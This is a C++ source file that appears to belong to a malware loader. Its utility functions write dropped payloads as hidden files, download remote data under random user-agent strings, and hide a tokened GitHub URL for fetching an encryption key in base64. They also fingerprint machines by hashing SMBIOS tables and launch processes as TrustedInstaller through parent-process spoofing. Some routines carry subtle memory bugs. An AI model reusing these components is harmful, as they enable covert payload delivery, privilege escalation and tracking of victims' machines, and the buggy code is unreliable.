#include "_riftldr.h"

namespace utl {
	BOOL IIsUserAdmin() {
		PSID pSId;
		SID_IDENTIFIER_AUTHORITY ia = SECURITY_NT_AUTHORITY;
		BOOL bSId = AllocateAndInitializeSid(&ia, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSId);
		if (bSId) {
			if (!CheckTokenMembership(NULL, pSId, &bSId))
				bSId = FALSE;

			FreeSid(pSId);
		}

		return bSId;
	}

	void* ELoadResourceW(
		_In_  WORD    wResID,
		_In_  PCWSTR  pResType,
		_Out_ size_t* nBufferSize
	) {
		HRSRC hResInfo = FindResourceW(NULL, MAKEINTRESOURCEW(wResID), pResType);
		if (hResInfo) {
			HGLOBAL hgData = LoadResource(NULL, hResInfo);
			if (hgData) {
				void* lpBuffer = LockResource(hgData);
				if (!lpBuffer)
					return NULL;

				*nBufferSize = SizeofResource(NULL, hResInfo);
				if (!*nBufferSize)
					return NULL;

				return lpBuffer;
			}
		}

		return NULL;
	}

	PDWORD EGetProcessIdbyName(
		_In_  PCWSTR  pProcessName,
		_Out_ size_t* nProcesses
	) {
		HANDLE hPSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hPSnap == INVALID_HANDLE_VALUE)
			return 0;

		PROCESSENTRY32W pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32W);

		PDWORD pProcesses = NULL;
		if (Process32FirstW(hPSnap, &pe32)) {
			*nProcesses = 0;
			do {
				if (!lstrcmpiW(pe32.szExeFile, pProcessName)) {
					if (pProcesses)
						pProcesses = (dword*)realloc(pProcesses, sizeof(dword) * *nProcesses);
					else
						pProcesses = (dword*)malloc(sizeof(dword));

					pProcesses[*nProcesses] = pe32.th32ProcessID;
					(*nProcesses)++;
				}
			} while (Process32Next(hPSnap, &pe32));
		}

		CloseHandle(hPSnap);
		return pProcesses;
	}

	void* AllocReadFileW(
		_In_  PCWSTR  szFileName,
		_Out_ size_t* nFileSize
	) {
		void* pRet = NULL;
		HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			return NULL;

		LARGE_INTEGER liFS;
		BOOL bT = GetFileSizeEx(hFile, &liFS);
		void* pFile;
		if (!bT || (liFS.HighPart || !liFS.LowPart))
			goto EXIT;

		pFile = VirtualAlloc(nullptr, liFS.LowPart, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!pFile)
			goto EXIT;

		bT = ReadFile(hFile, pFile, liFS.LowPart, (dword*)nFileSize, NULL);
		if (!bT) {
			free(pFile);
			goto EXIT;
		}

		pRet = pFile;
	EXIT:
		CloseHandle(hFile);
		return pRet;
	}

	BOOL WriteFileCW(
		_In_ PCWSTR pFileName,
		_In_ void*  pBuffer,
		_In_ size_t nBuffer
	) {
		HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (hFile) {
			dword dwT;
			BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, NULL);
			CloseHandle(hFile);
			return bT;
		}
		else
			return FALSE;
	}

	DEPRECATED PCWSTR GetFileNameFromPathW(
		_In_ PCWSTR pPath
	) {
		size_t nResult;
		StringCchLengthW(pPath, MAX_PATH, (size_t*)&nResult);

		for (uint i = nResult; i > 2; i--)
			if (pPath[i - 1] == L'\\')
				return pPath + i;

		return NULL;
	}

	DEPRECATED BOOL EExtractResource(
		_In_ PCWSTR szFileName,
		_In_ WORD   wResID
	) {
		size_t nData;
		void* pData = cry::EUnpackResource(wResID, &nData);
		BOOL bT = WriteFileCW(szFileName, pData, nData);
		free(pData);
		return bT;
	}

	// Only Test rn but might be implemented further
	DEPRECATED void* IDownloadKey() {
		PCWSTR szAgent = rng::EAllocRandomBase64StringW(NULL, 8, 16);
		HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		if (!hNet)
			return NULL;
		free((void*)szAgent);

		PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
		size_t nURL;
		// PCSTR szURL = EBase64DecodeA(szB64URL, 156, &nURL);
		// HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, NULL, 0, NULL, NULL);
		// if (!hUrl)
		return NULL;
		// free(szURL);

		void* pBuffer = malloc(AES_BLOB_SIZE);
		size_t nRead;
		// InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);

		// InternetCloseHandle(hUrl);
		InternetCloseHandle(hNet);
		if ((nRead != AES_BLOB_SIZE) || ((dword)pBuffer != 0x4d42444b)) {
			free(pBuffer);
			return NULL;
		}

		return pBuffer;
	}

	status EDownloadFile(        // Reads Data from Url (downloads File) / returns size read
		_In_     PCWSTR szUrl,   // Url to read from
		_In_opt_ int    nOffset, // Offset to start reading from
		_In_     void*  pBuffer, // Buffer to read to
		_In_     size_t nSize    // count of Bytes to read (also Buffer size)
	) {
		BOOL s = InternetCheckConnectionW(szUrl, NULL, NULL);
		if (!s)
			return -1; // Couldn't connect to Url/Server
		PCWSTR szAgent = rng::EAllocRandomBase64StringW(NULL, 8, 16);
		HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		free((void*)szAgent);
		if (!hNet)
			return -2; // Couldn't start Internet-Services
		HINTERNET hUrl = InternetOpenUrlW(hNet, szUrl, NULL, 0, NULL, NULL);
		if (!hUrl)
			return -3; // Couldn't open Url

		if (nOffset)
			InternetSetFilePointer(hUrl, nOffset, NULL, FILE_BEGIN, NULL);
		s = InternetReadFile(hUrl, pBuffer, nSize, (dword*)&nSize);
		BOOL sT = s;
		s = InternetCloseHandle(hUrl);
		s = InternetCloseHandle(hNet);
		if (!sT)
			return -4; // Couldn't read File
		return nSize;
	}

	// so apperently every kind of data im grabbing is different
	// so fuck me in the ass, this is basically a session id now
	VOID IGenerateSessionId(
		_Out_ uuid* pSId
	) {
		// Prepare Hashing
		BCRYPT_ALG_HANDLE ah;
		BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, nullptr, NULL);
		BCRYPT_HASH_HANDLE hh;
		BCryptCreateHash(ah, &hh, nullptr, 0, nullptr, 0, NULL);

		const dword dwFTPS[] = { 'ACPI', 'FIRM', 'RSMB' };
		for (char i = 0; i < sizeof(dwFTPS) / sizeof(dword); i++) {
			// Enumerate Table Entries
			size_t nTableId = EnumSystemFirmwareTables(dwFTPS[i], nullptr, 0);
			dword* pTableId = (dword*)malloc(nTableId);
			EnumSystemFirmwareTables(dwFTPS[i], pTableId, nTableId);

			for (uchar j = 0; j < nTableId / sizeof(dword); j++) {
				// Get Table
				size_t nTable = GetSystemFirmwareTable(dwFTPS[i], pTableId[j], nullptr, 0);
				void* pTable = malloc(nTable);
				GetSystemFirmwareTable(dwFTPS[i], pTableId[j], pTable, nTable);

				// Hash Table
				BCryptHashData(hh, (uchar*)pTable, nTable, NULL);
				free(pTable);
			}

			free(pTableId);
		}

		// Finish Hashing
		BCryptFinishHash(hh, (uchar*)pSId, sizeof(md5), NULL);
		BCryptDestroyHash(hh);
		BCryptCloseAlgorithmProvider(ah, NULL);
	}

	// this generates a true hardware id by parsing the table
	// and only hashing specific entries (also avoiding specific fields)
	VOID IGenerateHardwareId(
		_Out_ uuid* pHwId
	) {
		// Get SMBios Table
		typedef struct _RawSMBIOSData {
			byte  Used20CallingMethod;
			byte  SMBIOSMajorVersion;
			byte  SMBIOSMinorVersion;
			byte  DmiRevision;
			dword Length;
			byte  SMBIOSTableData[];
		} SMBIOS, * PSMBIOS;
		dword dwTable;
		EnumSystemFirmwareTables('RSMB', &dwTable, sizeof(dwTable));
		size_t nTable = GetSystemFirmwareTable('RSMB', dwTable, NULL, 0);
		PSMBIOS smTable = (SMBIOS*)malloc(nTable);
		GetSystemFirmwareTable('RSMB', dwTable, smTable, nTable);

		// Prepare Hashing
		BCRYPT_ALG_HANDLE ah;
		BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
		BCRYPT_HASH_HANDLE hh;
		BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);

		// Get First Entry
		typedef struct _SMBIOSTableHeader {
			byte bType;
			byte nLength;
			WORD wHandle;
		} SMTABLEHDR, * PSMTABLEHDR;
		PSMTABLEHDR pEntry = (SMTABLEHDR*)smTable->SMBIOSTableData;
		while (pEntry->bType != 127) {
			// Start of String Table
			void* pStringTable = (void*)((ptr)pEntry + pEntry->nLength);

			// Get Entry Size and next Entry Address
			while (*((PWORD)pStringTable) != (WORD)0x0000)
				(*(ptr*)&pStringTable)++;
			size_t nEntry = ((ptr)pStringTable + 2) - (ptr)pEntry;

			// Test if Entry should be hashed
			const byte bTypes[] = {
				0x00, // BIOS            : O
				0x04, // Processor       : S
				0x07, // Cache           : O
				0x08, // Ports           : O
				0x09, // Slots           : O
				0x10, // Physical Memory : O
				0x11, // Memory Devices  : O
				0x02  // Baseboard       : X
			};
			for (uchar i = 0; i < sizeof(bTypes); i++) {
				if (pEntry->bType == bTypes[i]) {
					if (pEntry->bType == 4) {
						// Avoid "Current Speed" Field
						BCryptHashData(hh, (uchar*)pEntry, 0x16, NULL);
						BCryptHashData(hh, (uchar*)pEntry + 0x18, nEntry - 0x18, NULL);
					} else
						BCryptHashData(hh, (uchar*)pEntry, nEntry, NULL);
					break;
				}
			}

			// Set Address of next Entry
			*(ptr*)&pEntry += nEntry;
		}

		// Finish Hashing
		BCryptFinishHash(hh, (uchar*)pHwId, sizeof(*pHwId), NULL);
		BCryptDestroyHash(hh);
		BCryptCloseAlgorithmProvider(ah, NULL);
		free(smTable);
	}

	BOOL ERunAsTrustedInstaller(
		_In_     PCWSTR szFileName,
		_In_     PCWSTR szCmdLine,
		_In_opt_ PCWSTR szDirectory
	) {
		// Open and Start TrustedInstaller Service
		SC_HANDLE hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		BOOL LE = GetLastError();
		if (!hSCM)
			return LE;
		SC_HANDLE hSer = OpenServiceW(hSCM, L"TrustedInstaller", GENERIC_EXECUTE);
		LE = GetLastError();
		if (!hSer)
			return LE;
		BOOL bS = StartServiceW(hSer, NULL, NULL);

		// Open TrustedInstaller Process
		size_t nProc;
		PDWORD pProc = EGetProcessIdbyName(L"TrustedInstaller.exe", &nProc);
		bS = EAdjustPrivilege(SE_DEBUG_NAME, TRUE);
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pProc[0]);
		LE = GetLastError();

		// Setup StartupInformation
		STARTUPINFOEXW si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.StartupInfo.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		size_t nAttributeList;
		InitializeProcThreadAttributeList(NULL, 1, NULL, (SIZE_T*)&nAttributeList);
		si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(nAttributeList);
		InitializeProcThreadAttributeList(si.lpAttributeList, 1, NULL, (SIZE_T*)&nAttributeList);
		UpdateProcThreadAttribute(si.lpAttributeList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);

		// Launch Process Under TrustedInstaller
		PWSTR pCmdLineC;
		if (szCmdLine) {
			size_t nCmdLine;
			StringCchLengthW(szCmdLine, PATHCCH_MAX_CCH, &nCmdLine);
			pCmdLineC = (PWSTR)malloc((nCmdLine + 1) * sizeof(WCHAR));
			CopyMemory(pCmdLineC, szCmdLine, (nCmdLine + 1) * sizeof(WCHAR));
		}
		else
			pCmdLineC = NULL;
		bS = CreateProcessW(szFileName, pCmdLineC, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, szDirectory, (STARTUPINFO*)&si, &pi);
		if (bS) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		} if (pCmdLineC)
			free(pCmdLineC);
		LE = GetLastError();
		// Stop Service
		SERVICE_STATUS ss;
		ControlService(hSer, SERVICE_CONTROL_STOP, &ss);
		CloseServiceHandle(hSer);
		CloseServiceHandle(hSCM);

		return 0;
	}
}